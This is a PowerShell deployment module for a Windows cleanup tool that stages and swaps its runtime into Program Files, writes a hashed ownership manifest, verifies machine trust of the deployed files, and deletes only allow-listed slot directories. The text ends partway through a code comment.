<#
.SYNOPSIS
    Deployment, machine-trust VERIFICATION and scheduled-task ownership proof.

.DESCRIPTION
    Three safety-critical responsibilities:

      * Copy the runtime into %ProgramFiles%\WindowsAutoCleanup through a staging directory and an
        atomic rename, so the SYSTEM task never executes the user's mutable checkout (ledger P0-3).
      * VERIFY that the deployed tree is machine-trusted. The v1.1.0 ACL-hardening capability was
        REMOVED on request (ledger P0-6 / U-2): it rewrote the owner and DACL of the user's own
        checkout and left the folder hard to delete. Nothing in this module calls Set-Acl,
        SetOwner, SetAccessRuleProtection, icacls or takeown. An unreadable or user-writable path
        is reported untrusted so every caller fails closed.
      * Prove a scheduled task belongs to this project before overwriting or deleting it. Both the
        installer and the uninstaller used to act on ANY task named WindowsAutoCleanup (P0-4).

    The FileSystem module's deletion primitives cannot be used here: Initialize-WacRun registers the
    deployment root as a PROTECTED root, so Remove-WacTree correctly refuses it. Deletion in this
    module is therefore direct, bounded, never follows a reparse point, and is restricted by an
    allow-list of exactly three canonical paths.
#>

Set-StrictMode -Version 2.0

# No -Force: force-reloading a nested module tears it out of the caller's session too.
Import-Module -Name (Join-Path -Path $PSScriptRoot -ChildPath 'WindowsAutoCleanup.Core.psm1') -DisableNameChecking -ErrorAction Stop

# Only for Clear-WacBlockingAttribute: Copy-Item preserves a read-only attribute, and File.Delete
# throws on a read-only file. The FileSystem deletion primitives themselves are unusable here,
# because Initialize-WacRun registers the deployment root as a protected root and they refuse it.
Import-Module -Name (Join-Path -Path $PSScriptRoot -ChildPath 'WindowsAutoCleanup.FileSystem.psm1') -DisableNameChecking -ErrorAction Stop

$script:TaskName = 'WindowsAutoCleanup'
$script:TaskFolder = '\WindowsAutoCleanup\'

# ONE machine-wide lock covers runtime, install, upgrade and uninstall (ledger B2-3). Until now the
# entry points took 'Global\WindowsAutoCleanupInstaller' while Run.ps1 took 'Global\WindowsAutoCleanup',
# so a cleanup run and a deployment replacement held DIFFERENT locks and could not see each other:
# the uninstaller could delete the tree a live run was executing out of.
#
# The value is deliberately the one Run.ps1 already defaults its -MutexName to, so the runtime needs
# no change and every existing command line keeps working. Run.ps1 cannot call this function - it does
# not import this module - so Deploy.Tests.ps1 parses Run.ps1's parameter default and fails if the two
# ever drift.
$script:OperationLockName = 'Global\WindowsAutoCleanup'

# Register-ScheduledTask exposes only -Description, so a fixed sentinel inside the description is
# the sole ownership marker a PowerShell-only installer can write. Never change this value: an
# installed task with the old sentinel would stop being recognised as ours.
$script:TaskSentinel = 'WindowsAutoCleanupTaskId=9d1f6d2a-6d3a-4f77-9a41-2f2b0f1f5c10'

$script:TaskDescriptionText = 'Runs WindowsAutoCleanup daily to remove allow-listed temporary and cache locations from drive C:.'

# The exact description v1.0.0/v1.1.0 wrote at the ROOT task path. Used only to adopt that task.
$script:LegacyTaskDescription = 'Runs WindowsAutoCleanup daily to silently remove explicitly allowed temporary files and cache locations from drive C:.'

# The tree is Run.ps1 + src + LICENSE; 8 levels is far more than it can legitimately need.
$script:MaxTreeDepth = 8

# The deployment's own ownership marker (ledger B2-3). A directory sitting at the expected path is
# NOT evidence that we put it there, and deleting one on that basis is how an installer destroys an
# unrelated product. Same never-change rule as the task sentinel: an installed deployment carrying
# the old id would stop being recognised as ours and could never be replaced or removed again.
$script:DeploymentProjectId = 'WindowsAutoCleanupDeployment=4a83c6d1-70b5-4c2e-9f18-6d0a2b7e5c34'
$script:DeploymentManifestName = 'wac-deployment.json'
$script:DeploymentManifestSchema = 1

# Kept here rather than read out of Run.ps1 at runtime: parsing another script for a version string
# is a coupling that breaks silently when its formatting changes. Deploy.Tests.ps1 asserts this
# equals Run.ps1's $script:Version, so drift fails a test instead of shipping a lying manifest.
$script:DeploymentVersion = '1.2.0'

# Exactly what Copy-WacDeploymentTree puts at the top level of a deployment, plus the manifest. A
# root holding anything else was not written by this project.
$script:DeploymentTopLevelName = @('Run.ps1', 'src', 'LICENSE', $script:DeploymentManifestName)

function Get-WacTaskName { return $script:TaskName }
function Get-WacTaskFolder { return $script:TaskFolder }
function Get-WacTaskSentinel { return $script:TaskSentinel }
function Get-WacTaskDescription { return ('{0} {1}' -f $script:TaskDescriptionText, $script:TaskSentinel) }
function Get-WacOperationLockName { return $script:OperationLockName }
function Get-WacDeploymentVersion { return $script:DeploymentVersion }
function Get-WacDeploymentProjectId { return $script:DeploymentProjectId }

function Get-WacDeploymentManifestPath {
    param([string]$DeploymentRoot)

    if ([string]::IsNullOrWhiteSpace($DeploymentRoot)) { $DeploymentRoot = Get-WacDeploymentRoot }
    return (Join-Path -Path $DeploymentRoot -ChildPath $script:DeploymentManifestName)
}

# ---------------------------------------------------------------------------------------------
# Bounded, never-following tree walk
# ---------------------------------------------------------------------------------------------

function Test-WacIsExcludedDeploymentName {
    <#
    .SYNOPSIS
        True for a name that must never reach the deployment: logs and every dot-directory
        (.git, .ai, .claude, .kiro, .codex, .Comments, .ignoreme and anything like them).
    #>
    param([Parameter(Mandatory = $true)][AllowEmptyString()][string]$Name)

    if ([string]::IsNullOrWhiteSpace($Name)) { return $true }
    if ($Name.StartsWith('.')) { return $true }
    if ($Name -ieq 'Logs') { return $true }
    return $false
}

function Get-WacDeploymentItem {
    <#
    .SYNOPSIS
        Depth-bounded walk that never descends into a reparse point.
    .DESCRIPTION
        Get-ChildItem -Recurse follows junctions, which both loops and escapes the tree. A reparse
        point found inside a deployment is reported rather than followed, because the copy never
        creates one and its presence means something else wrote into the tree.
    .OUTPUTS
        Records with Path, IsDirectory and IsReparsePoint. Nothing is filtered out: a delete pass
        that skipped a name would leave the parent directory non-empty and fail.
    #>
    [CmdletBinding()]
    param(
        [Parameter(Mandatory = $true)][string]$Root,
        [int]$Depth = 0
    )

    $items = New-Object 'System.Collections.Generic.List[object]'
    if ($Depth -ge $script:MaxTreeDepth) { return @($items.ToArray()) }

    $children = @()
    try {
        $children = @(Get-ChildItem -LiteralPath $Root -Force -ErrorAction Stop)
    }
    catch {
        return @($items.ToArray())
    }

    foreach ($entry in $children) {
        $isDirectory = [bool]$entry.PSIsContainer
        $isReparse = Test-WacIsReparsePoint -Path $entry.FullName

        [void]$items.Add([PSCustomObject]@{
            Path = $entry.FullName
            IsDirectory = $isDirectory
            IsReparsePoint = $isReparse
        })

        if ($isDirectory -and -not $isReparse) {
            foreach ($child in (Get-WacDeploymentItem -Root $entry.FullName -Depth ($Depth + 1))) {
                [void]$items.Add($child)
            }
        }
    }

    return @($items.ToArray())
}

function Copy-WacDeploymentTree {
    <#
    .SYNOPSIS
        Recursive copy that skips excluded names and never follows a reparse point.
    #>
    [CmdletBinding()]
    param(
        [Parameter(Mandatory = $true)][string]$Source,
        [Parameter(Mandatory = $true)][string]$Destination,
        [int]$Depth = 0
    )

    if ($Depth -ge $script:MaxTreeDepth) {
        throw ("The source tree is deeper than {0} levels: {1}" -f $script:MaxTreeDepth, $Source)
    }

    if (-not (Test-Path -LiteralPath $Destination -PathType Container)) {
        New-Item -Path $Destination -ItemType Directory -Force -ErrorAction Stop | Out-Null
    }

    foreach ($entry in @(Get-ChildItem -LiteralPath $Source -Force -ErrorAction Stop)) {
        if (Test-WacIsExcludedDeploymentName -Name $entry.Name) { continue }
        if (Test-WacIsReparsePoint -Path $entry.FullName) { continue }

        $target = Join-Path -Path $Destination -ChildPath $entry.Name
        if ($entry.PSIsContainer) {
            Copy-WacDeploymentTree -Source $entry.FullName -Destination $target -Depth ($Depth + 1)
        }
        else {
            Copy-Item -LiteralPath $entry.FullName -Destination $target -Force -ErrorAction Stop
        }
    }
}

# ---------------------------------------------------------------------------------------------
# Deployment
# ---------------------------------------------------------------------------------------------

function Get-WacDeploymentSlotPath {
    <#
    .SYNOPSIS
        The three canonical paths this module is ever allowed to delete.
    #>
    param([string]$DeploymentRoot)

    if ([string]::IsNullOrWhiteSpace($DeploymentRoot)) { $DeploymentRoot = Get-WacDeploymentRoot }
    $root = Get-WacNormalizedPath -Path $DeploymentRoot
    if (-not $root) { return $null }

    return [PSCustomObject]@{
        Root = $root
        Staging = ($root + '.staging')
        Previous = ($root + '.previous')
    }
}

function Remove-WacDeploymentEntry {
    <#
    .SYNOPSIS
        Deletes one file or one empty directory. Returns $null on success, or the failure message.
    #>
    param(
        [Parameter(Mandatory = $true)][string]$Path,
        [switch]$IsDirectory
    )

    $longPath = Get-WacLongPath -Path $Path

    for ($attempt = 0; $attempt -lt 2; $attempt++) {
        try {
            if ($IsDirectory) { [System.IO.Directory]::Delete($longPath, $false) }
            else { [System.IO.File]::Delete($longPath) }
            return $null
        }
        catch {
            # Classified rather than typed-caught: a .NET method exception reaches PowerShell wrapped,
            # and the two hosts disagree about whether a typed catch matches the inner exception.
            if ($attempt -eq 0 -and
                (Get-WacIoFailureKind -ErrorRecord $_) -eq 'Denied' -and
                (Clear-WacBlockingAttribute -LongPath $longPath)) {
                continue
            }
            return ('{0}: {1}' -f $Path, $_.Exception.Message)
        }
    }

    return ('{0}: the entry could not be deleted.' -f $Path)
}

function Remove-WacDeployment {
    <#
    .SYNOPSIS
        Deletes one deployment slot directory. Bounded, never follows a link, never touches a
        source checkout.
    .DESCRIPTION
        The allow-list is the point: only the canonical deployment root and its two swap slots can
        be passed. Anything else - above all the user's own checkout - is refused.
    #>
    [CmdletBinding()]
    param(
        [Parameter(Mandatory = $true)][string]$Path,
        [string]$DeploymentRoot
    )

    $result = [PSCustomObject]@{ Path = $Path; Removed = $false; Reason = $null }

    $slots = Get-WacDeploymentSlotPath -DeploymentRoot $DeploymentRoot
    $normalized = Get-WacNormalizedPath -Path $Path
    if (-not $slots -or -not $normalized) {
        $result.Reason = 'The path could not be normalised.'
        return $result
    }

    $allowed = @($slots.Root, $slots.Staging, $slots.Previous)
    $isAllowed = $false
    foreach ($candidate in $allowed) {
        if ($normalized -ieq $candidate) { $isAllowed = $true; break }
    }

    if (-not $isAllowed) {
        $result.Reason = 'Refused: only the deployment root and its swap slots may be deleted.'
        Write-WacLog -Level WARNING -Component 'Deploy' -Message 'Refused a delete outside the deployment slots.' -Data @{ path = $normalized }
        return $result
    }

    if (-not (Test-Path -LiteralPath $normalized -PathType Container)) {
        $result.Removed = $true
        $result.Reason = 'Nothing to remove.'
        return $result
    }

    if (Test-WacIsReparsePoint -Path $normalized) {
        # Delete the link itself, never its target. Remove-Item throws a spurious
        # NullReferenceException on some junctions under Windows PowerShell 5.1.
        try {
            [System.IO.Directory]::Delete((Get-WacLongPath -Path $normalized), $false)
            $result.Removed = $true
        }
        catch {
            $result.Reason = $_.Exception.Message
        }
        return $result
    }

    if (-not (Test-WacPathResolvesToItself -Path $normalized)) {
        $result.Reason = 'The path does not resolve to itself; a component may have been swapped.'
        Write-WacLog -Level WARNING -Component 'Deploy' -Message 'Refused a delete whose final path differs from the requested path.' -Data @{ path = $normalized }
        return $result
    }

    $items = @(Get-WacDeploymentItem -Root $normalized)

    # Deepest first by separator count, so a directory is always empty by the time it is deleted.
    # Sorting the path STRING would be culture-aware and is not a reliable depth order.
    foreach ($item in @($items | Sort-Object -Property @{ Expression = { $_.Path.Split('\').Length } } -Descending)) {
        $failure = Remove-WacDeploymentEntry -Path $item.Path -IsDirectory:$item.IsDirectory
        if ($failure) { $result.Reason = $failure }
    }

    $failure = Remove-WacDeploymentEntry -Path $normalized -IsDirectory
    if ($failure) { $result.Reason = $failure }
    else {
        $result.Removed = $true
        $result.Reason = $null
    }

    return $result
}

function Get-WacDeploymentFileHash {
    <#
    .SYNOPSIS
        The uppercase SHA-256 of one file, or $null when it cannot be read.
    #>
    param([Parameter(Mandatory = $true)][string]$Path)

    try { return ([string](Get-FileHash -LiteralPath $Path -Algorithm SHA256 -ErrorAction Stop).Hash).ToUpperInvariant() }
    catch { return $null }
}

function New-WacDeploymentManifest {
    <#
    .SYNOPSIS
        Writes the protected deployment manifest into a staged tree and returns what it recorded.
    .DESCRIPTION
        Ledger B2-3: nothing may mutate a deployment it cannot prove it owns, and a same-name
        directory at the expected path proves nothing. The manifest is the ownership marker - a
        fixed project id, the version that wrote it, and the SHA-256 of every file - so a later
        install or uninstall can tell OUR tree from someone else's.

        The manifest never lists itself: a file cannot carry its own hash.
    #>
    [CmdletBinding()]
    param([Parameter(Mandatory = $true)][string]$StagingRoot)

    $entries = New-Object 'System.Collections.Generic.List[object]'
    $prefix = $StagingRoot.TrimEnd('\') + '\'

    foreach ($item in @(Get-WacDeploymentItem -Root $StagingRoot)) {
        if ($item.IsDirectory) { continue }
        if ($item.IsReparsePoint) { throw ("The staged tree contains a reparse point: {0}" -f $item.Path) }

        $relative = $item.Path
        if ($relative.StartsWith($prefix, [System.StringComparison]::OrdinalIgnoreCase)) {
            $relative = $relative.Substring($prefix.Length)
        }
        if ($relative -ieq $script:DeploymentManifestName) { continue }

        $hash = Get-WacDeploymentFileHash -Path $item.Path
        if (-not $hash) { throw ("A staged file could not be hashed: {0}" -f $item.Path) }

        [void]$entries.Add([PSCustomObject]@{
            Path = $relative
            Sha256 = $hash
            Length = [long](New-Object System.IO.FileInfo($item.Path)).Length
        })
    }

    if ($entries.Count -eq 0) { throw ("The staged tree is empty: {0}" -f $StagingRoot) }

    $manifest = [PSCustomObject]@{
        Schema = $script:DeploymentManifestSchema
        ProjectId = $script:DeploymentProjectId
        Version = $script:DeploymentVersion
        CreatedUtc = ([datetime]::UtcNow.ToString('yyyy-MM-ddTHH:mm:ssZ', [System.Globalization.CultureInfo]::InvariantCulture))
        File = @(@($entries.ToArray()) | Sort-Object -Property Path)
    }

    # UTF-8 without a BOM, written through .NET rather than Out-File: the default encoding of
    # Set-Content differs between the two shipped hosts and the manifest is compared byte-for-byte
    # by nothing, but read by ConvertFrom-Json on both.
    $json = ConvertTo-Json -InputObject $manifest -Depth 4
    [System.IO.File]::WriteAllText((Join-Path -Path $StagingRoot -ChildPath $script:DeploymentManifestName),
        $json, (New-Object System.Text.UTF8Encoding($false)))

    return $manifest
}

function Read-WacDeploymentManifest {
    <#
    .SYNOPSIS
        The manifest recorded in a deployment root, or $null when there is none it can read.
    #>
    param([Parameter(Mandatory = $true)][string]$DeploymentRoot)

    $path = Get-WacDeploymentManifestPath -DeploymentRoot $DeploymentRoot
    if (-not (Test-Path -LiteralPath $path -PathType Leaf)) { return $null }
    if (Test-WacIsReparsePoint -Path $path) { return $null }

    try { return (ConvertFrom-Json -InputObject ([System.IO.File]::ReadAllText($path))) }
    catch { return $null }
}

function Get-WacDeploymentOwnership {
    <#
    .SYNOPSIS
        Proves - or refuses to prove - that the directory at the deployment path belongs to us.
    .DESCRIPTION
        Ledger B2-3. Nothing here deletes or replaces anything; it answers the single question every
        mutation has to ask first. Four kinds:

          Absent    - nothing is there. Safe to create.
          Managed   - our manifest is there and its project id matches. Safe to replace or remove.
          Unmanaged - no manifest, but the top level holds ONLY the names this project deploys and
                      an empty directory or one carrying Run.ps1. That is what every deployment made
                      before the manifest existed looks like, and refusing it would strand every
                      already-installed machine: the upgrade could never replace the old tree and the
                      uninstaller could never remove it. A BENIGN, EXPECTED steady state must not
                      produce a security refusal, so this is adopted - and logged as adopted.
          Foreign   - anything else, including a reparse point standing in for the root. Refused, and
                      the caller must leave it exactly as it found it.

        Tampered is REPORTED, not refused. A hash that no longer matches means the tree changed since
        it was installed, which is worth logging - but making it flip ownership would mean a single
        edited file locks the deployment in place forever, unremovable and unreplaceable. Identity is
        the project id and the layout; the hashes are evidence about content.
    .OUTPUTS
        Root, Exists, Kind, IsOurs, Version, Tampered, Findings, Reason.
    #>
    [CmdletBinding()]
    param([string]$DeploymentRoot)

    if ([string]::IsNullOrWhiteSpace($DeploymentRoot)) { $DeploymentRoot = Get-WacDeploymentRoot }

    $result = [PSCustomObject]@{
        Root = $DeploymentRoot
        Exists = $false
        Kind = 'Foreign'
        IsOurs = $false
        Version = $null
        Tampered = $false
        Findings = @()
        Reason = $null
    }

    $root = Get-WacNormalizedPath -Path $DeploymentRoot
    if (-not $root) {
        $result.Reason = 'The deployment path is not a supported local path.'
        return $result
    }
    $result.Root = $root

    if (-not (Test-Path -LiteralPath $root)) {
        $result.Exists = $false
        $result.Kind = 'Absent'
        $result.IsOurs = $true
        $result.Reason = 'Nothing is deployed at this path.'
        return $result
    }

    $result.Exists = $true

    if (Test-WacIsReparsePoint -Path $root) {
        $result.Reason = 'The deployment path is a reparse point, so deleting it would act on whatever it points at.'
        return $result
    }
    if (-not (Test-Path -LiteralPath $root -PathType Container)) {
        $result.Reason = 'The deployment path exists but is not a directory.'
        return $result
    }
    if (-not (Test-WacPathResolvesToItself -Path $root)) {
        $result.Reason = 'The deployment path does not resolve to itself; a component may have been swapped.'
        return $result
    }

    # The top level is checked before the manifest is trusted: a foreign directory could carry a
    # copied manifest, and the layout is what makes that copy implausible.
    $unexpected = New-Object 'System.Collections.Generic.List[string]'
    foreach ($entry in @(Get-ChildItem -LiteralPath $root -Force -ErrorAction SilentlyContinue)) {
        $known = $false
        foreach ($name in $script:DeploymentTopLevelName) {
            if ([string]::Equals([string]$entry.Name, $name, [System.StringComparison]::OrdinalIgnoreCase)) { $known = $true; break }
        }
        if (-not $known) { [void]$unexpected.Add([string]$entry.Name) }
    }

    if ($unexpected.Count -gt 0) {
        $result.Findings = @($unexpected.ToArray())
        $result.Reason = ('The directory holds names this project never deploys, so it is not ours: {0}' -f
            ((@($unexpected.ToArray()) | Sort-Object) -join ', '))
        return $result
    }

    $manifest = Read-WacDeploymentManifest -DeploymentRoot $root
    if (-not $manifest) {
        $hasRun = Test-Path -LiteralPath (Join-Path -Path $root -ChildPath 'Run.ps1') -PathType Leaf
        $isEmpty = (@(Get-ChildItem -LiteralPath $root -Force -ErrorAction SilentlyContinue).Count -eq 0)
        if (-not $hasRun -and -not $isEmpty) {
            $result.Reason = 'The directory carries no deployment manifest and no Run.ps1, so it cannot be proven ours.'
            return $result
        }

        $result.Kind = 'Unmanaged'
        $result.IsOurs = $true
        $result.Reason = 'No manifest, but the layout is exactly what this project deployed before manifests existed.'
        return $result
    }

    $projectId = ''
    try { $projectId = [string]$manifest.ProjectId } catch { $projectId = '' }
    if (-not [string]::Equals($projectId, $script:DeploymentProjectId, [System.StringComparison]::Ordinal)) {
        $result.Reason = 'The deployment manifest carries a different project identity.'
        return $result
    }

    try { $result.Version = [string]$manifest.Version } catch { $result.Version = $null }

    $files = @()
    try { $files = @($manifest.File) } catch { $files = @() }

    $mismatch = New-Object 'System.Collections.Generic.List[string]'
    foreach ($entry in $files) {
        $relative = ''
        $expected = ''
        try { $relative = [string]$entry.Path } catch { $relative = '' }
        try { $expected = [string]$entry.Sha256 } catch { $expected = '' }
        if (-not $relative) { continue }

        $full = Join-Path -Path $root -ChildPath $relative
        if (-not (Test-Path -LiteralPath $full -PathType Leaf)) {
            [void]$mismatch.Add(('{0}: missing' -f $relative))
            continue
        }

        $actual = Get-WacDeploymentFileHash -Path $full
        if (-not $actual -or -not [string]::Equals($actual, $expected, [System.StringComparison]::OrdinalIgnoreCase)) {
            [void]$mismatch.Add(('{0}: content differs from the manifest' -f $relative))
        }
    }

    $result.Kind = 'Managed'
    $result.IsOurs = $true
    $result.Tampered = ($mismatch.Count -gt 0)
    $result.Findings = @($mismatch.ToArray())
    $result.Reason = if ($result.Tampered) {
        ('Our manifest, but {0} file(s) no longer match it.' -f $mismatch.Count)
    }
    else {
        ('Our manifest, version {0}, and all {1} recorded files match.' -f [string]$result.Version, $files.Count)
    }
    return $result
}

function New-WacDeploymentStage {
    <#
    .SYNOPSIS
        Builds the complete new deployment in the .staging slot and writes its manifest. Nothing the
        running task can reach is touched.
    .DESCRIPTION
        Split out of Install-WacDeployment for ledger B2-3's ordering rule: the caller must be able
        to VERIFY the tree, and resolve the existing scheduled task, before anything goes live. The
        staging slot is a different directory from the deployment root, so building it cannot change
        a file the currently registered task would execute.
    .OUTPUTS
        StagingRoot, Manifest, FileCount, Version.
    #>
    [CmdletBinding()]
    param([Parameter(Mandatory = $true)][string]$SourceRoot)

    $source = Get-WacNormalizedPath -Path $SourceRoot
    if (-not $source -or -not (Test-Path -LiteralPath $source -PathType Container)) {
        throw ("The source directory does not exist: {0}" -f $SourceRoot)
    }

    $slots = Get-WacDeploymentSlotPath
    if (-not $slots) { throw 'The deployment root could not be resolved.' }

    if ((Test-WacIsWithinRoot -ChildPath $source -RootPath $slots.Root) -or
        (Test-WacIsWithinRoot -ChildPath $slots.Root -RootPath $source)) {
        throw ("The source checkout overlaps the deployment root ({0}); move the checkout elsewhere and re-run." -f $slots.Root)
    }

    $sourceRun = Join-Path -Path $source -ChildPath 'Run.ps1'
    $sourceSrc = Join-Path -Path $source -ChildPath 'src'
    if (-not (Test-Path -LiteralPath $sourceRun -PathType Leaf)) { throw ("Run.ps1 was not found in {0}." -f $source) }
    if (-not (Test-Path -LiteralPath $sourceSrc -PathType Container)) { throw ("The src directory was not found in {0}." -f $source) }

    foreach ($slot in @($slots.Staging, $slots.Previous)) {
        $cleared = Remove-WacDeployment -Path $slot
        if (-not $cleared.Removed) {
            throw ("A leftover deployment slot could not be cleared: {0} ({1})" -f $slot, $cleared.Reason)
        }
    }

    Write-WacLog -Level INFO -Component 'Deploy' -Message 'Staging the deployment.' -Data @{ source = $source; staging = $slots.Staging }

    New-Item -Path $slots.Staging -ItemType Directory -Force -ErrorAction Stop | Out-Null
    Copy-Item -LiteralPath $sourceRun -Destination (Join-Path -Path $slots.Staging -ChildPath 'Run.ps1') -Force -ErrorAction Stop
    Copy-WacDeploymentTree -Source $sourceSrc -Destination (Join-Path -Path $slots.Staging -ChildPath 'src')

    $sourceLicense = Join-Path -Path $source -ChildPath 'LICENSE'
    if (Test-Path -LiteralPath $sourceLicense -PathType Leaf) {
        Copy-Item -LiteralPath $sourceLicense -Destination (Join-Path -Path $slots.Staging -ChildPath 'LICENSE') -Force -ErrorAction Stop
    }

    $manifest = New-WacDeploymentManifest -StagingRoot $slots.Staging

    # Read the staged tree back through the same ownership proof the deployment root will face. Here
    # a hash mismatch IS fatal - it means the copy did not land intact - unlike on an installed tree,
    # where refusing on it would make an edited file impossible to replace.
    $staged = Get-WacDeploymentOwnership -DeploymentRoot $slots.Staging
    if ($staged.Kind -ne 'Managed' -or $staged.Tampered) {
        [void](Remove-WacDeployment -Path $slots.Staging)
        throw ("The staged deployment did not verify against its own manifest: {0}" -f $staged.Reason)
    }

    return [PSCustomObject]@{
        StagingRoot = $slots.Staging
        Manifest = $manifest
        FileCount = @($manifest.File).Count
        Version = $script:DeploymentVersion
    }
}

function Switch-WacDeploymentStage {
    <#
    .SYNOPSIS
        Atomically swaps the staged tree into the deployment root.
    .DESCRIPTION
        Move-old-aside / move-staging-in, with the old tree restored if the second move fails. With
        -KeepPrevious the old tree is LEFT in the .previous slot so the caller can roll back after a
        later step - registering the task, or asserting what it registered - fails.
    .OUTPUTS
        DeploymentRoot, RunScript, FileCount, PreviousKept.
    #>
    [CmdletBinding()]
    param([switch]$KeepPrevious)

    $slots = Get-WacDeploymentSlotPath
    if (-not $slots) { throw 'The deployment root could not be resolved.' }
    if (-not (Test-Path -LiteralPath $slots.Staging -PathType Container)) {
        throw ("There is no staged deployment to switch into place: {0}" -f $slots.Staging)
    }

    $movedAside = $false
    if (Test-Path -LiteralPath $slots.Root -PathType Container) {
        [System.IO.Directory]::Move($slots.Root, $slots.Previous)
        $movedAside = $true
    }

    try {
        [System.IO.Directory]::Move($slots.Staging, $slots.Root)
    }
    catch {
        if ($movedAside) {
            try { [System.IO.Directory]::Move($slots.Previous, $slots.Root) }
            catch { Write-WacLog -Level CRITICAL -Component 'Deploy' -Message 'The previous deployment could not be restored.' -Data @{ previous = $slots.Previous; root = $slots.Root } }
        }
        throw ("The staging directory could not be swapped into place: {0}" -f $_.Exception.Message)
    }

    $keptPrevious = $false
    if ($movedAside) {
        if ($KeepPrevious) {
            $keptPrevious = $true
        }
        else {
            $discarded = Remove-WacDeployment -Path $slots.Previous
            if (-not $discarded.Removed) {
                # The new deployment is already live, so this is untidy rather than fatal.
                Write-WacLog -Level WARNING -Component 'Deploy' -Message 'The previous deployment could not be deleted.' -Data @{ path = $slots.Previous; reason = $discarded.Reason }
            }
        }
    }

    $fileCount = @(Get-WacDeploymentItem -Root $slots.Root | Where-Object { -not $_.IsDirectory }).Count
    Write-WacLog -Level INFO -Component 'Deploy' -Message 'Deployment switched into place.' -Data @{ root = $slots.Root; files = $fileCount; previousKept = $keptPrevious }

    return [PSCustomObject]@{
        DeploymentRoot = $slots.Root
        RunScript = (Join-Path -Path $slots.Root -ChildPath 'Run.ps1')
        FileCount = $fileCount
        PreviousKept = $keptPrevious
    }
}

function Restore-WacDeploymentPrevious {
    <#
    .SYNOPSIS
        Undoes a switch: discards the new deployment and puts the kept previous tree back.
    .DESCRIPTION
        Only ever called after Switch-WacDeploymentStage -KeepPrevious, so the tree it deletes is the
        one this run just wrote. When there was no previous deployment the root is simply removed,
        which is the correct rollback of a first install.
    .OUTPUTS
        Restored, HadPrevious, Reason.
    #>
    [CmdletBinding()]
    param()

    $result = [PSCustomObject]@{ Restored = $false; HadPrevious = $false; Reason = $null }

    $slots = Get-WacDeploymentSlotPath
    if (-not $slots) {
        $result.Reason = 'The deployment root could not be resolved.'
        return $result
    }

    $result.HadPrevious = Test-Path -LiteralPath $slots.Previous -PathType Container

    $removed = Remove-WacDeployment -Path $slots.Root
    if (-not $removed.Removed) {
        $result.Reason = ('The new deployment could not be removed, so the previous one was not restored: {0}' -f [string]$removed.Reason)
        return $result
    }

    if (-not $result.HadPrevious) {
        $result.Restored = $true
        $result.Reason = 'There was no previous deployment; the new one was removed.'
        return $result
    }

    try {
        [System.IO.Directory]::Move($slots.Previous, $slots.Root)
        $result.Restored = $true
        $result.Reason = 'The previous deployment was restored.'
    }
    catch {
        $result.Reason = ('The previous deployment could not be restored: {0}' -f $_.Exception.Message)
    }

    return $result
}

function Remove-WacDeploymentPrevious {
    <#
    .SYNOPSIS
        Discards the kept previous deployment once the new one is registered and verified.
    #>
    [CmdletBinding()]
    param()

    $slots = Get-WacDeploymentSlotPath
    if (-not $slots) { return $false }
    if (-not (Test-Path -LiteralPath $slots.Previous)) { return $true }

    $discarded = Remove-WacDeployment -Path $slots.Previous
    if (-not $discarded.Removed) {
        Write-WacLog -Level WARNING -Component 'Deploy' -Message 'The previous deployment could not be deleted.' -Data @{ path = $slots.Previous; reason = [string]$discarded.Reason }
    }
    return [bool]$discarded.Removed
}

function Install-WacDeployment {
    <#
    .SYNOPSIS
        Stage-and-switch in one call, discarding the previous tree. The installer uses the two phases
        separately so it can verify and roll back between them.
    .OUTPUTS
        DeploymentRoot, RunScript, FileCount.
    #>
    [CmdletBinding()]
    param([Parameter(Mandatory = $true)][string]$SourceRoot)

    [void](New-WacDeploymentStage -SourceRoot $SourceRoot)
    $switched = Switch-WacDeploymentStage

    return [PSCustomObject]@{
        DeploymentRoot = $switched.DeploymentRoot
        RunScript = $switched.RunScript
        FileCount = $switched.FileCount
    }
}


function Test-WacDeploymentTrusted {
    <#
    .SYNOPSIS
        VERIFIES that a standard user cannot modify anything the SYSTEM task will execute.
    .DESCRIPTION
        Verification only. This function never mutates an ACL, an owner or an inheritance flag -
        that capability was removed (ledger P0-6 / U-2). Every directory and every deployed
        .ps1/.psm1 is checked, because write access to a directory is enough to replace the file
        inside it - and so is every ANCESTOR of the deployment root and of the PowerShell host the
        task will run, up to and including the volume root (ledger R-22). Anything unreadable or
        unexpected leaves IsTrusted false so callers fail closed.
    #>
    [CmdletBinding()]
    param([string]$DeploymentRoot)

    if ([string]::IsNullOrWhiteSpace($DeploymentRoot)) { $DeploymentRoot = Get-WacDeploymentRoot }

    $result = [PSCustomObject]@{
        DeploymentRoot = $DeploymentRoot
        IsTrusted = $false
        CheckedCount = 0
        Untrusted = @()
        Reason = $null
    }

    $root = Get-WacNormalizedPath -Path $DeploymentRoot
    if (-not $root -or -not (Test-Path -LiteralPath $root -PathType Container)) {
        $result.Reason = 'The deployment root does not exist.'
        return $result
    }

    $untrusted = New-Object 'System.Collections.Generic.List[object]'
    $toCheck = New-Object 'System.Collections.Generic.List[string]'
    [void]$toCheck.Add($root)

    foreach ($item in @(Get-WacDeploymentItem -Root $root)) {
        if ($item.IsReparsePoint) {
            [void]$untrusted.Add([PSCustomObject]@{
                Path = $item.Path
                Reason = 'A reparse point inside the deployment can redirect execution outside it.'
                Owner = $null
            })
            continue
        }

        if (-not $item.IsDirectory) {
            if ([System.IO.Path]::GetExtension($item.Path) -notmatch '(?i)^\.psm?1$') { continue }
        }

        [void]$toCheck.Add($item.Path)
    }

    $checkedSet = New-Object 'System.Collections.Generic.HashSet[string]' -ArgumentList ([System.StringComparer]::OrdinalIgnoreCase)
    $reported = New-Object 'System.Collections.Generic.HashSet[string]' -ArgumentList ([System.StringComparer]::OrdinalIgnoreCase)

    foreach ($path in $toCheck) {
        [void]$checkedSet.Add($path)
        $trust = Test-WacPathIsMachineTrusted -Path $path
        if (-not $trust.IsTrusted) {
            [void]$reported.Add($path)
            [void]$untrusted.Add([PSCustomObject]@{ Path = $path; Reason = $trust.Reason; Owner = $trust.Owner })
        }
    }

    # Ancestors (ledger R-22). Verifying only the leaf proves less than it looks: write access to a
    # PARENT is enough to rename the whole deployment aside and drop a different one in its place.
    #
    # Core owns this walk now (ledger B2-3). Test-WacStatePathIsTrusted answers exactly the ancestor
    # question - "can a non-administrator REPLACE or REDIRECT this", not the strict "can anyone write
    # here at all" that the deployed files themselves are held to - and it additionally proves the
    # chain is on a ready local FIXED disk and free of reparse points. This module used to carry its
    # own copy of that rule (Get-WacPathAncestor plus Test-WacAncestorDescriptorIsTrusted); two
    # copies of a security decision is one copy that gets fixed and one that does not.
    #
    # Two chains, not one per file: every directory INSIDE the deployment is already in $toCheck, so
